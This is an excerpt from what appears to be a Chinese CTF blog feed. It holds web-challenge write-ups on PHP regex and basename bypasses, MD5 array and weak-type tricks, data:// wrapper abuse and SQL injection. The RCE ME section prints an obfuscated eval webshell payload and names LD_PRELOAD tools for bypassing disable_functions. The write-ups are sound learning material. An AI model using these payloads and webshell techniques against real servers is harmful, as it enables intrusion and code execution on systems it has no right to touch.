show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>开头就讲明包含了utils.php</p><p>接着POST传参，涉及到好多过滤</p><p>采用Y1ng大佬思路：<a href="https://www.gem-love.com/ctf/1898.html">🇯🇵zer0pts CTF 2020 Writeup – 颖奇L’Amore (gem-love.com)</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>正则的匹配 ban 掉了 config.php。然后会 <code>highlight_file()</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>可以发现这里加上了 <code>basename()</code> 可能是为了跨目录读文件，而问题正好出在了这里，</p><p>演示：</p><p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012193624036.png" alt="image-20211012193624036"></p><p>可以看到被挡了，但至少说明我们思路正确</p><p>当我访问 index.php 时，我可以在后面加上一些东西，比如 /index.php/utils.php，这样仍然访问的是 index.php，但经过 <code>basename()</code> 后，传进 <code>highlight_file()</code> 函数的文件名就变成了 utils.php，如果能绕过那个正则，就可以得到 utils.php 源码了，而题目告诉 FLAG 就在 config.php 里，这道题就做完了。</p><p>可以发现，这个正则匹配了 utils.php/ 为 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 的结尾</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">utils\.php\<span class="hljs-regexp">/*$/i</span><br></code></pre></td></tr></table></figure><p>老套路了，可以用 %0d 之类的来污染绕过，这样仍然访问得到 index.php:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php/u</span>tils.php%<span class="hljs-number">0</span>d<br></code></pre></td></tr></table></figure><p>然后看了大佬的wp，直接打？</p><p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194757043.png" alt="image-20211012194757043"></p><p>我对这个%81不是很理解，在本地试了一下</p><p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194837502.png" alt="image-20211012194837502"></p><p>这个符号？？？</p><p>不过还真的一打就成，可是原理我不太懂啊</p><p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194930406.png" alt="image-20211012194930406"></p><p>还得问问大佬</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 RCE ME</title>
      <link href="/2021/09/29/2021/ctf/25/"/>
      <url>/2021/09/29/2021/ctf/25/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/29/2021/ctf/25/image-20210929213110592.png" alt="image-20210929213110592"></p><p>GET传参</p><p>strlen：长度不超过40</p><p>preg_match：匹配英文字母和数字，die NO</p><p>满足条件就当做php执行并且不报错</p><p>[<a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">极客大挑战 2019]RCE ME - 云千 - 博客园 (cnblogs.com)</a></p><p>参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">可以用异或或者取反绕过<br>异或绕过是指使用各种特殊字符的异或构造出字母和数字。取反绕过是对语句取反。<br></code></pre></td></tr></table></figure><p>生成查询PHP info 的payload代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> urlencode(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p><p>构造完的语句进行查询：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure><p><img src="/2021/09/29/2021/ctf/25/image-20210929213713432.png" alt="image-20210929213713432"></p><p>看一些信息:</p><p><img src="/2021/09/29/2021/ctf/25/image-20210929213849813.png" alt="image-20210929213849813"></p><p>禁用的函数相当的多</p><p>先传木马连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>$a=<span class="hljs-string">&#x27;assert&#x27;</span>;<br>$b=urlencode(~$a);<br><span class="hljs-keyword">echo</span> $b;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>$c=<span class="hljs-string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;<br>$d=urlencode(~$c);<br><span class="hljs-keyword">echo</span> $d;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code=(~<span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%8</span>C<span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%8</span>D<span class="hljs-symbol">%8</span>B)(~<span class="hljs-symbol">%D7</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%89</span><span class="hljs-symbol">%9</span>E<span class="hljs-symbol">%93</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%DB</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%B0</span><span class="hljs-symbol">%AC</span><span class="hljs-symbol">%AB</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%92</span><span class="hljs-symbol">%90</span><span class="hljs-symbol">%9</span>C<span class="hljs-symbol">%97</span><span class="hljs-symbol">%8</span>A<span class="hljs-symbol">%C8</span><span class="hljs-symbol">%A2</span><span class="hljs-symbol">%D6</span><span class="hljs-symbol">%D6</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/29/2021/ctf/25/image-20210929214111148.png" alt="image-20210929214111148"></p><p>连上之后发现权限过低</p><p><img src="/2021/09/29/2021/ctf/25/image-20210929214319688.png" alt="image-20210929214319688"></p><p>要读取flag，需要先执行readflag,但是因为禁用了很多函数，没有办法执行命令，这时候需要绕过disable_functions.方法好像很多，有的用蚁剑的插件，有的劫持共享so，也有一些工具<br>1.这里用工具<br>地址<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），</p><p>2.蚁剑插件直接绕过</p><p><img src="/2021/09/29/2021/ctf/25/image-20210929214454384.png" alt="image-20210929214454384"></p><p><img src="/2021/09/29/2021/ctf/25/image-20210929214557378.png" alt="image-20210929214557378"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 wirteup</title>
      <link href="/2021/09/28/2021/ctf/24/"/>
      <url>/2021/09/28/2021/ctf/24/</url>
      
        <content type="html"><![CDATA[<p>​    参考了Y1ng大佬的博客：<a href="https://www.gem-love.com/ctf/2184.html">https://www.gem-love.com/ctf/2184.html</a></p><p>真的写得很棒，看着十分舒服，还在评论区提出一点小建议（希望不会被师傅嘲笑）</p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>这题难度不大，我卡在了编写脚本上</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928193418732.png" alt="image-20210928193418732"></p><p>常规源码查看</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928193507092.png" alt="image-20210928193507092"></p><p>这里的绕过和BJDCTF的Ezphp一段代码类似，本来以为也可以url编码绕过</p><p>结果上面出现了计数：%5f不能出现，因为_编码后就是%5f,所以就要求其他方法绕过了</p><p>_ 用 ‘  ’ 绕过，而后面的正则匹配表示匹配字符串的开头和结尾</p><p>在字符串中换行可以表示字符串的结尾，所以可以用%0a（换行符的url编码）绕过</p><p>所以payload：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?b u p t=<span class="hljs-number">23333</span>%<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/2021/09/28/2021/ctf/24/image-20210928194036030.png" alt="image-20210928194036030"></p><p>得到提示</p><p>去访问secrettw.php页面</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928194130440.png" alt="image-20210928194130440"></p><p>whoa，被挡了</p><p>添加Client-ip：127.0.0.1</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928194319439.png" alt="image-20210928194319439"></p><p>再次查看源码：</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928194351650.png" alt="image-20210928194351650"></p><h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>原来是和js有关的代码，</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928194516235.png" alt="image-20210928194516235"></p><p>提示我们posy传参Merak</p><p>任意赋值：Merak=1</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928194610158.png" alt="image-20210928194610158"></p><p>好了，源码出来了</p><p>代码分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params">$v</span>)</span>&#123; <br>  $v = base64_decode($v); <br>  $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>  <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>    $re .= chr ( ord ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>  &#125; <br>  <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以写一个逆向的脚本来满足要求：</p><h4 id="逆方向脚本"><a href="#逆方向脚本" class="headerlink" title="逆方向脚本"></a>逆方向脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unchange</span>(<span class="hljs-params">$v</span>)</span>&#123; <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= chr ( ord ($v[$i]) - $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br>$real_flag = unchange(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> base64_encode($real_flag);<br><span class="hljs-comment">//ZmpdYSZmXGI=</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到：ZmpdYSZmXGI=</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ip</span> = getIp();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-built_in">echo</span> file_get_contents(change(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br></code></pre></td></tr></table></figure><p>ip我们已经添加了</p><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><p>传入参数2333用伪协议绕过，?2333=data://text/plain,todat is a happy day</p><p>这里有的师傅特意用了base64绕过：data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</p><p>file传入我们尚书脚本跑出的数据：file=ZmpdYSZmXGI=</p><p>到这里小心一个坑，就是不用再post传参了：</p><p>不然会被highlight_file函数截断</p><p>然后一键flag啦</p><p><img src="/2021/09/28/2021/ctf/24/image-20210928195347754.png" alt="image-20210928195347754"></p><p><img src="/2021/09/28/2021/ctf/24/image-20210928195408850.png" alt="image-20210928195408850"></p><h2 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h2><p>比较简单的代码审计题</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929155243165.png" alt="image-20210929155243165"></p><p>整理一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>$flag=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric($passwd))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure><p>开头看到十分熟悉的include</p><p>告诉我们这个页面可以打印出和flag.php里一样的变量值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    $id=$_GET[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    $gg=$_GET[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="MD5值相同的变量"><a href="#MD5值相同的变量" class="headerlink" title="MD5值相同的变量"></a>MD5值相同的变量</h4><p>第一层，要求GET传入变量gg和id，两个变量的值不同但是md5值要相同</p><p>自然想到数组绕过（也可以去找0e开头MD5相同的一组值）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">?gg[]=<span class="hljs-number">1</span>&amp;id[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/28/2021/ctf/24/image-20210929155726680.png" alt="image-20210929155726680"></p><p>看第二个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            $passwd=$_POST[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!is_numeric($passwd))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;<br></code></pre></td></tr></table></figure><h4 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h4><p>这里考察了php弱类型的知识</p><p>当传入字符串时，==会强制转换为数字再进行比较</p><p>所以POST传参：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">passwd</span>=<span class="hljs-number">1234567</span>a<br></code></pre></td></tr></table></figure><p><img src="/2021/09/28/2021/ctf/24/image-20210929160016795.png" alt="image-20210929160016795"></p><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p><img src="/2021/09/28/2021/ctf/24/image-20210929161638378.png" alt="image-20210929161638378"></p><p>开幕雷击，doge</p><p>哈哈其实是我学爬虫的视频介绍网站模板的时候就是跟这个同一家，很亲切</p><p>发现页面不太友好，没有任何提示</p><h4 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h4><p>dirsearch扫一下，有源码泄露：<a href="http://www.zip/">www.zip</a></p><p>下载下来得到index.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);<br>        $result = mysql_query($getuser);<br>        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-comment">// genarate public_key </span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;<br>    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $public_key;<br>  &#125;<br><br>  <span class="hljs-comment">//genarate private_key</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;<br>    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )<br>    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> $private_key;<br>  &#125;<br>  $Public_key = public_key();<br>  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></code></pre></td></tr></table></figure><p>代码里告诉了我们一个页面：login.html</p><p>访问看一下：</p><p><img src="/2021/09/28/2021/ctf/24/image-20210929161956786.png" alt="image-20210929161956786"></p><p>分析了一下代码</p><p>用户名和密码、私钥都不能为空</p><p>按照第三段判断，</p><p>用户名为crispr，密码那里可以看到很明显的单引号SQL注入漏洞</p><p>难的就是私钥啊啊啊</p><h4 id="直接借用Y1ng大佬的过程"><a href="#直接借用Y1ng大佬的过程" class="headerlink" title="直接借用Y1ng大佬的过程"></a>直接借用Y1ng大佬的过程</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span 